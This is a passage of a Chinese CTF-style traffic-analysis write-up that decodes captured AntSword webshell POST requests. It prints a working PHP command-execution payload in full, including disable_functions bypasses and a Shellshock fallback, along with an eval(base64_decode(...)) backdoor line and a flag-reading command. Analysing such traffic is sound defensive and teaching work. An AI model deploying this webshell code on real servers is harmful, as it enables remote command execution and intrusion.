class="number">2</span>Fzb<span class="number">3</span>V<span class="number">0</span>cHV<span class="number">0</span>KCk<span class="number">7</span>ZGllKCk<span class="number">7</span>&amp;o<span class="number">1</span>faebd<span class="number">4</span>ec<span class="number">3</span>d<span class="number">97</span>=jmL<span class="number">2</span>Jpbi<span class="number">9</span>zaA%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure>

<p>一眼丁真，直接上php,快速处理一下</p>
<figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">[<span class="string">&quot;_GET&quot;</span>]=&gt;</span><br><span class="line"><span class="built_in">array</span>(<span class="number">0</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line">[<span class="string">&quot;_POST&quot;</span>]=&gt;</span><br><span class="line"><span class="built_in">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;cmd&quot;</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">76</span>) <span class="string">&quot;var_dump(get_defined_vars());@eval(@base64_decode($_POST[&#x27;kc1b01ee4a605&#x27;]));&quot;</span></span><br><span class="line">  [<span class="string">&quot;e57fb9c067c677&quot;</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">2</span>) <span class="string">&quot;E8&quot;</span></span><br><span class="line">  [<span class="string">&quot;g479cf6f058cf8&quot;</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">98</span>) <span class="string">&quot;hnY2QgIi9Vc2Vycy9jaGFuZy9TaXRlcy90ZXN0IjtoZWFkIC1uIC4uL2ZsYWcudHh0O2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ==&quot;</span></span><br><span class="line">  [<span class="string">&quot;kc1b01ee4a605&quot;</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">3476</span>) <span class="string">&quot;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiZjlhIi4iYTI1MCI7ZWNobyBAYXNlbmMoJG91dHB1dCk7ZWNobyAiMTNlIi4iM2I5Ijt9b2Jfc3RhcnQoKTt0cnl7JHA9YmFzZTY0X2RlY29kZShzdWJzdHIoJF9QT1NUWyJvMWZhZWJkNGVjM2Q5NyJdLDIpKTskcz1iYXNlNjRfZGVjb2RlKHN1YnN0cigkX1BPU1RbImc0NzljZjZmMDU4Y2Y4Il0sMikpOyRlbnZzdHI9QGJhc2U2NF9kZWNvZGUoc3Vic3RyKCRfUE9TVFsiZTU3ZmI5YzA2N2M2NzciXSwyKSk7JGQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOyRjPXN1YnN0cigkZCwwLDEpPT0iLyI/Ii1jIFwieyRzfVwiIjoiL2MgXCJ7JHN9XCIiO2lmKHN1YnN0cigkZCwwLDEpPT0iLyIpe0BwdXRlbnYoIlBBVEg9Ii5nZXRlbnYoIlBBVEgiKS4iOi91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL3NiaW46L3Vzci9iaW46L3NiaW46L2JpbiIpO31lbHNle0BwdXRlbnYoIlBBVEg9Ii5nZXRlbnYoIlBBVEgiKS4iO0M6L1dpbmRvd3Mvc3lzdGVtMzI7QzovV2luZG93cy9TeXNXT1c2NDtDOi9XaW5kb3dzO0M6L1dpbmRvd3MvU3lzdGVtMzIvV2luZG93c1Bvd2VyU2hlbGwvdjEuMC87Iik7fWlmKCFlbXB0eSgkZW52c3RyKSl7JGVudmFycj1leHBsb2RlKCJ8fHxhc2xpbmV8fHwiLCAkZW52c3RyKTtmb3JlYWNoKCRlbnZhcnIgYXMgJHYpIHtpZiAoIWVtcHR5KCR2KSkge0BwdXRlbnYoc3RyX3JlcGxhY2UoInx8fGFza2V5fHx8IiwgIj0iLCAkdikpO319fSRyPSJ7JHB9IHskY30iO2Z1bmN0aW9uIGZlKCRmKXskZD1leHBsb2RlKCIsIixAaW5pX2dldCgiZGlzYWJsZV9mdW5jdGlvbnMiKSk7aWYoZW1wdHkoJGQpKXskZD1hcnJheSgpO31lbHNleyRkPWFycmF5X21hcCgndHJpbScsYXJyYXlfbWFwKCdzdHJ0b2xvd2VyJywkZCkpO31yZXR1cm4oZnVuY3Rpb25fZXhpc3RzKCRmKSYmaXNfY2FsbGFibGUoJGYpJiYhaW5fYXJyYXkoJGYsJGQpKTt9O2Z1bmN0aW9uIHJ1bnNoZWxsc2hvY2soJGQsICRjKSB7aWYgKHN1YnN0cigkZCwgMCwgMSkgPT0gIi8iICYmIGZlKCdwdXRlbnYnKSAmJiAoZmUoJ2Vycm9yX2xvZycpIHx8IGZlKCdtYWlsJykpKSB7aWYgKHN0cnN0cihyZWFkbGluaygiL2Jpbi9zaCIpLCAiYmFzaCIpICE9IEZBTFNFKSB7JHRtcCA9IHRlbXBuYW0oc3lzX2dldF90ZW1wX2RpcigpLCAnYXMnKTtwdXRlbnYoIlBIUF9MT0w9KCkgeyB4OyB9OyAkYyA+JHRtcCAyPiYxIik7aWYgKGZlKCdlcnJvcl9sb2cnKSkge2Vycm9yX2xvZygiYSIsIDEpO30gZWxzZSB7bWFpbCgiYUAxMjcuMC4wLjEiLCAiIiwgIiIsICItYnYiKTt9fSBlbHNlIHtyZXR1cm4gRmFsc2U7fSRvdXRwdXQgPSBAZmlsZV9nZXRfY29udGVudHMoJHRtcCk7QHVubGluaygkdG1wKTtpZiAoJG91dHB1dCAhPSAiIikge3ByaW50KCRvdXRwdXQpO3JldHVybiBUcnVlO319cmV0dXJuIEZhbHNlO307ZnVuY3Rpb24gcnVuY21kKCRjKXskcmV0PTA7JGQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKGZlKCdzeXN0ZW0nKSl7QHN5c3RlbSgkYywkcmV0KTt9ZWxzZWlmKGZlKCdwYXNzdGhydScpKXtAcGFzc3RocnUoJGMsJHJldCk7fWVsc2VpZihmZSgnc2hlbGxfZXhlYycpKXtwcmludChAc2hlbGxfZXhlYygkYykpO31lbHNlaWYoZmUoJ2V4ZWMnKSl7QGV4ZWMoJGMsJG8sJHJldCk7cHJpbnQoam9pbigiCiIsJG8pKTt9ZWxzZWlmKGZlKCdwb3BlbicpKXskZnA9QHBvcGVuKCRjLCdyJyk7d2hpbGUoIUBmZW9mKCRmcCkpe3ByaW50KEBmZ2V0cygkZnAsMjA0OCkpO31AcGNsb3NlKCRmcCk7fWVsc2VpZihmZSgncHJvY19vcGVuJykpeyRwID0gQHByb2Nfb3BlbigkYywgYXJyYXkoMSA9PiBhcnJheSgncGlwZScsICd3JyksIDIgPT4gYXJyYXkoJ3BpcGUnLCAndycpKSwgJGlvKTt3aGlsZSghQGZlb2YoJGlvWzFdKSl7cHJpbnQoQGZnZXRzKCRpb1sxXSwyMDQ4KSk7fXdoaWxlKCFAZmVvZigkaW9bMl0pKXtwcmludChAZmdldHMoJGlvWzJdLDIwNDgpKTt9QGZjbG9zZSgkaW9bMV0pO0BmY2xvc2UoJGlvWzJdKTtAcHJvY19jbG9zZSgkcCk7fWVsc2VpZihmZSgnYW50c3lzdGVtJykpe0BhbnRzeXN0ZW0oJGMpO31lbHNlaWYocnVuc2hlbGxzaG9jaygkZCwgJGMpKSB7cmV0dXJuICRyZXQ7fWVsc2VpZihzdWJzdHIoJGQsMCwxKSE9Ii8iICYmIEBjbGFzc19leGlzdHMoIkNPTSIpKXskdz1uZXcgQ09NKCdXU2NyaXB0LnNoZWxsJyk7JGU9JHctPmV4ZWMoJGMpOyRzbz0kZS0+U3RkT3V0KCk7JHJldC49JHNvLT5SZWFkQWxsKCk7JHNlPSRlLT5TdGRFcnIoKTskcmV0Lj0kc2UtPlJlYWRBbGwoKTtwcmludCgkcmV0KTt9ZWxzZXskcmV0ID0gMTI3O31yZXR1cm4gJHJldDt9OyRyZXQ9QHJ1bmNtZCgkci4iIDI+JjEiKTtwcmludCAoJHJldCE9MCk/InJldD17JHJldH0iOiIiOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7&quot;</span></span><br><span class="line">  [<span class="string">&quot;o1faebd4ec3d97&quot;</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">14</span>) <span class="string">&quot;jmL2Jpbi9zaA==&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先处理一下最长的<code>kc1b01ee4a605</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;f9a&quot;</span> . <span class="string">&quot;a250&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;13e&quot;</span> . <span class="string">&quot;3b9&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;o1faebd4ec3d97&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$s</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;g479cf6f058cf8&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$envstr</span> = @base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;e57fb9c067c677&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$c</span> = substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> ? <span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span> : <span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line">        <span class="variable">$envarr</span> = explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">                @putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$r</span> = <span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$d</span> = explode(<span class="string">&quot;,&quot;</span>, @ini_get(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$d</span> = array_map(<span class="string">&#x27;trim&#x27;</span>, array_map(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$d</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (function_exists(<span class="variable">$f</span>) &amp;&amp; is_callable(<span class="variable">$f</span>) &amp;&amp; !in_array(<span class="variable">$f</span>, <span class="variable">$d</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">                <span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">                putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">                    error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">            @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (fe(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">            @system(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">            @passthru(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">            @exec(<span class="variable">$c</span>, <span class="variable">$o</span>, <span class="variable">$ret</span>);</span><br><span class="line">            <span class="keyword">print</span>(join(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>, <span class="variable">$o</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$fp</span> = @popen(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>, <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose(<span class="variable">$fp</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>], <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>], <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">            @proc_close(<span class="variable">$p</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">            @antsystem(<span class="variable">$c</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$w</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">            <span class="variable">$e</span> = <span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);</span><br><span class="line">            <span class="variable">$so</span> = <span class="variable">$e</span>-&gt;StdOut();</span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$so</span>-&gt;ReadAll();</span><br><span class="line">            <span class="variable">$se</span> = <span class="variable">$e</span>-&gt;StdErr();</span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$se</span>-&gt;ReadAll();</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="variable">$ret</span> = @runcmd(<span class="variable">$r</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    <span class="keyword">print</span> (<span class="variable">$ret</span> != <span class="number">0</span>) ? <span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span> : <span class="string">&quot;&quot;</span>;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p>这两个函数十分关键</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$p = base64_decode(<span class="keyword">substr</span>($_POST[<span class="string">&quot;o1faebd4ec3d97&quot;</span>], <span class="number">2</span>));</span><br><span class="line">$s = base64_decode(<span class="keyword">substr</span>($_POST[<span class="string">&quot;g479cf6f058cf8&quot;</span>], <span class="number">2</span>));</span><br></pre></td></tr></table></figure>

<p>因为<code>$_POST[&quot;o1faebd4ec3d97&quot;]</code>有亿点短，<br>直接先看看$s是个嘛玩意</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">&quot;/Users/chang/Sites/test&quot;</span>;head -n <span class="string">../flag.txt</span>;<span class="keyword">echo</span> [S];<span class="keyword">pwd</span>;<span class="keyword">echo</span> [E]</span><br></pre></td></tr></table></figure>

<p>嗯哼</p>
<p>直接看第18个包，继续古法炮制</p>
<figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line"> [<span class="string">&quot;_GET&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">array</span>(<span class="number">0</span>) &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> [<span class="string">&quot;_POST&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">   [<span class="string">&quot;cmd&quot;</span>]=&gt;</span><br><span class="line">   <span class="built_in">string</span>(<span class="number">77</span>) <span class="string">&quot;var_dump(get_defined_vars());@eval(@base64_decode($_POST[&#x27;t14ae029df18c6&#x27;]));&quot;</span></span><br><span class="line">   [<span class="string">&quot;e57fb9c067c677&quot;</span>]=&gt;</span><br><span class="line">   <span class="built_in">string</span>(<span class="number">2</span>) <span class="string">&quot;rX&quot;</span></span><br><span class="line">   [<span class="string">&quot;g479cf6f058cf8&quot;</span>]=&gt;</span><br><span class="line">   <span class="built_in">string</span>(<span class="number">98</span>) <span class="string">&quot;flY2QgIi9Vc2Vycy9jaGFuZy9TaXRlcy90ZXN0IjtoZWFkIC1uIDIgLi4vZmxhZy50eHQ7ZWNobyBbU107cHdkO2VjaG8gW0Vd&quot;</span></span><br><span class="line">   [<span class="string">&quot;o1faebd4ec3d97&quot;</span>]=&gt;</span><br><span class="line">   <span class="built_in">string</span>(<span class="number">14</span>) <span class="string">&quot;VyL2Jpbi9zaA==&quot;</span></span><br><span class="line">   [<span class="string">&quot;t14ae029df18c6&quot;</span>]=&gt;</span><br><span class="line">   <span class="built_in">string</span>(<span class="number">3492</span>) <span 